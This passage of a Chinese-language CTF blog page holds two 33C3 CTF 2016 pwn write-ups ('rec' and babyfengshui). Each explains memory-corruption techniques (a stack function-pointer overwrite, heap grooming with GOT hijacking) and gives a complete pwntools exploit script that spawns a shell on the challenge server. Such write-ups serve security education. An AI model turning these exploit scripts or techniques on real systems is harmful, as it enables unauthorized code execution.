<p>透過 gdb 我們還發現到 <code>sign</code> 這個 function 的 stack frame 比起其他的 function 都還要來的”高”( <code>ebp</code> 的值較低 )。因此如果要有辦法控制到 <code>v1</code>，我們必須想辦法在其他 function 裡面盡量”拉高” stack frame，進而控制到 <code>v1</code> 的值。</p>
<p>經過一連串的 fuzzing，我發現如果使用 Polish 的 <code>sum</code> 功能，我們可以藉由不斷的輸入數字來”拉高”程式的 stack frame，<strong>原因是因為程式會不斷地將數字 push 到 stack 上</strong>。透過這樣的方式，我們不但可以控制到 <code>v1</code> ( function pointer )，還可以控制到 function 的參數 !</p>
<p>因此總結一下思路:</p>
<ol>
<li>利用 take note 和 read note 來 leak text 段的 base address</li>
<li>利用 Polish 的 <code>sum</code> 功能來控制 <code>sign</code> function 裡面的 function pointer 和 function 參數。</li>
<li>我們首先將 function pointer 設成 <code>puts</code>，參數設成 <code>__libc_start_main@got</code> ( 這題因為是 FULL RELRO 的關係沒有 <code>.got.plt</code> )</li>
<li>呼叫 <code>sign</code> function，數字輸入 <code>0</code>，讓程式執行 <code>puts(__libc_start_main@got)</code></li>
<li>得到 libc 的 base address 之後重複 step 2~4，這次將目標改成執行 <code>system(&quot;/bin/sh&quot;)</code></li>
</ol>
<p>Final exploit : ( 這題 libc 的資訊可以透過 <a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a> 來獲得 )</p>
<figure class="highlight python"><figcaption><span>exp_rec.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;78.46.224.74&quot;</span></span><br><span class="line">PORT = <span class="number">4127</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./rec&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">take_note</span>(<span class="params">note</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;note: &quot;</span>, note)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_note</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">polish_sum</span>(<span class="params">nums</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Operator:&quot;</span>, <span class="string">&quot;S&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;adding:&quot;</span>, num</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;Operand:&quot;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Operand:&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    take_note(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">    read_note()</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;note: &quot;</span>)</span><br><span class="line">    fptr_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x350</span> <span class="comment"># where the function pointer be loaded</span></span><br><span class="line">    text_base = u32(r.recv(<span class="number">4</span>)) - <span class="number">0x6fb</span></span><br><span class="line">    puts = text_base + <span class="number">0x520</span></span><br><span class="line">    lsm_got = text_base + <span class="number">0x2fe0</span></span><br><span class="line">    puts_got = text_base + <span class="number">0x2fd8</span></span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">&quot;fptr_addr: &quot;</span>+<span class="built_in">hex</span>(fptr_addr))</span><br><span class="line">    log.success(<span class="string">&quot;text_base: &quot;</span>+<span class="built_in">hex</span>(text_base))</span><br><span class="line"></span><br><span class="line">    nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x63</span>)] + [puts, lsm_got]</span><br><span class="line">    polish_sum(nums)</span><br><span class="line"></span><br><span class="line">    sign(<span class="number">0</span>) <span class="comment"># this will call puts(lsm_got)</span></span><br><span class="line">    lsm_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#########################################</span></span><br><span class="line">    <span class="comment">#$ ./dump libc6-i386_2.24-3ubuntu2_amd64</span></span><br><span class="line">    <span class="comment">#offset___libc_start_main = 0x00018180</span></span><br><span class="line">    <span class="comment">#offset_system = 0x0003a8b0</span></span><br><span class="line">    <span class="comment">#offset_str_bin_sh = 0x15cbcf</span></span><br><span class="line">    <span class="comment">#########################################</span></span><br><span class="line">    system_addr = lsm_addr + <span class="number">0x22730</span> </span><br><span class="line">    bin_sh = lsm_addr + <span class="number">0x144a4f</span> </span><br><span class="line">	</span><br><span class="line">    log.success(<span class="string">&quot;lsm: &quot;</span>+<span class="built_in">hex</span>(lsm_addr))</span><br><span class="line">    log.success(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">    log.success(<span class="string">&quot;bin_sh: &quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">    nums = [i <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x63</span>)] + [numpy.int32(system_addr), numpy.int32(bin_sh)]</span><br><span class="line">    polish_sum(nums)</span><br><span class="line">    sign(<span class="number">0</span>) <span class="comment"># this time will call system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<p>flag: <code>33C3_L0rd_Nikon_would_l3t_u_1n</code>  </p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/my-2016">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/my-2016" itemprop="url">My 2016</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T11:39:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          Wrapping up 2016
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/my-2016">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/12/31/33C3-CTF-2016-babyfengshui-150/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/12/31/33C3-CTF-2016-babyfengshui-150/" itemprop="url">[33C3 CTF 2016] babyfengshui 150</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-31T09:36:00+08:00">
                2016-12-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 150<br>Author: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, Partial RELRO, canary &amp; NX enabled, 沒 PIE</p>
<p>程式選單 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./babyfengshui</span><br><span class="line">0: Add a user</span><br><span class="line">1: Delete a user</span><br><span class="line">2: Display a user</span><br><span class="line">3: Update a user description</span><br><span class="line">4: Exit</span><br></pre></td></tr></table></figure>
<p>Add a user:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Action: 0</span><br><span class="line">size of description: 50 &lt;-- max length of description</span><br><span class="line">name: AAAA </span><br><span class="line">text length: 12 &lt;-- actual length of description</span><br><span class="line">text: 1234</span><br></pre></td></tr></table></figure>
<p>Show a user:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Action: 2</span><br><span class="line">index: 0 &lt;-- user&#x27;s index</span><br><span class="line">name: AAAA</span><br><span class="line">description: 1234</span><br></pre></td></tr></table></figure>
<p>Update a user:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Action: 3</span><br><span class="line">index: 0</span><br><span class="line">text length: 10 &lt;-- new length of the description</span><br><span class="line">text: 1234567890</span><br></pre></td></tr></table></figure>
<p><code>user</code> 的 data structure</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* desc;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">124</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>程式在 delete user 的時候除了會 free 掉 <code>user-&gt;desc</code> 和 <code>user</code> 本身之外，還會將 <code>user</code> pointer 清成 0，因此這題並不存在 Use-After-Free 的漏洞。</p>
<p>程式在設置 <code>user-&gt;desc</code> 的時候有一個很奇怪的 protection:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// users = struct user *users[]</span></span><br><span class="line"> <span class="keyword">if</span> ( &amp;users[id]-&gt;desc[text_len] &gt;= &amp;users[id] - <span class="number">4</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line"> read_n(users[id]-&gt;desc, text_len + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>這段程式碼的意思是，<code>user-&gt;desc</code> 這個 pointer + <code>text_len</code> 必須小於 <code>user</code> 這個 pointer。感覺程式是想用這段程式碼來防止 <code>user</code> 被 <code>user-&gt;desc</code> 覆寫 ( 避免 heap overflow )。</p>
<p>可是這段保護真的有用嗎 ?</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>如果我們有辦法排出下圖的 heap memory layout:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">            +-----------------------+</span><br><span class="line">userD-&gt;desc |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br><span class="line">            |            userB-&gt;desc| userB</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br><span class="line">            |            userC-&gt;desc| userC</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br><span class="line">            |            userD-&gt;desc| userD</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            |                       |</span><br><span class="line">            +-----------------------+</span><br></pre></td></tr></table></figure>

<p>根據那段保護的程式碼，<code>userD-&gt;desc + text_len</code> 必須小於 <code>userD</code>。我們可以看到 <code>userD-&gt;desc</code> 離 <code>userD</code> 有一段距離，中間還包含了 <code>userB</code> 和 <code>userC</code> 這兩個 data structure，說明我們其實可以覆寫掉整個 <code>userB</code> 和 <code>userC</code>。</p>
<p>這裡只要對 malloc.c 的 memory allocation 機制熟悉的話，要排出上圖的 heap memory layout 並不難。之後只要透過上述的 heap overflow 方式，我們就可以改掉 <code>userB-&gt;desc</code> 這個 data pointer，進而做到任意讀寫，剩下的就是做 GOT hijacking 拿 shell。</p>
<figure class="highlight python"><figcaption><span>exp_baby.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;78.46.224.83&quot;</span></span><br><span class="line">PORT = <span class="number">1456</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./babyfengshui_noalarm&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;./libc-2.19.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_user</span>(<span class="params">desc_len, name, text_len, text</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;description: &quot;</span>, <span class="built_in">str</span>(desc_len))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;name: &quot;</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;length: &quot;</span>, <span class="built_in">str</span>(text_len))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;text: &quot;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_user</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_user</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_user</span>(<span class="params">index, text_len, text</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Action: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;length: &quot;</span>, <span class="built_in">str</span>(text_len))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;text: &quot;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">&quot;A&quot;</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">&quot;a&quot;</span>*<span class="number">12</span>)</span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">&quot;B&quot;</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">&quot;b&quot;</span>*<span class="number">12</span>) </span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">&quot;C&quot;</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">&quot;sh\x00&quot;</span>) <span class="comment"># user[2], desc = &quot;sh\x00&quot; (for later&#x27;s GOT hijacking)</span></span><br><span class="line">    del_user(<span class="number">0</span>)</span><br><span class="line">    add_user(<span class="number">90</span>, <span class="string">&quot;D&quot;</span>*<span class="number">123</span>, <span class="number">12</span>, <span class="string">&quot;d&quot;</span>*<span class="number">12</span>)</span><br><span class="line">    add_user(<span class="number">50</span>, <span class="string">&quot;E&quot;</span>*<span class="number">123</span>, <span class="number">0x100</span>, <span class="string">&quot;i&quot;</span>*<span class="number">0xf8</span> + p32(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])) </span><br><span class="line">    <span class="comment"># now user[4]&#x27;s desc is user[0]&#x27;s desc (in previous)</span></span><br><span class="line">    <span class="comment"># user[4]-&gt;desc + 0x2c8 = user[4], which means we can overflow user[4]-&gt;desc &amp; overwrite user[1]-&gt;desc to libc_start_main@got.plt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak address</span></span><br><span class="line">    show_user(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">    libc.address += u32(r.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    log.success(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># change user[1]-&gt;desc into free@got.plt</span></span><br><span class="line">    <span class="comment"># hijack free&#x27;s got, then free user[2] to get shell</span></span><br><span class="line">    update_user(<span class="number">4</span>, <span class="number">0x100</span>, <span class="string">&quot;i&quot;</span>*<span class="number">0xf8</span> + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">    update_user(<span class="number">1</span>, <span class="number">5</span>, p32(system_addr))</span><br><span class="line">    del_user(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<p>flag: <code>33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/43/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/43/">43</a><span class="page-number current">44</span><a class="page-number" href="/page/45/">45</a><span class="space">&hellip;</span><a class="page-number" href="/page/73/">73</a><a class="extend next" rel="next" href="/page/45/">&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1451</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">71</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">914</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5358884258"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
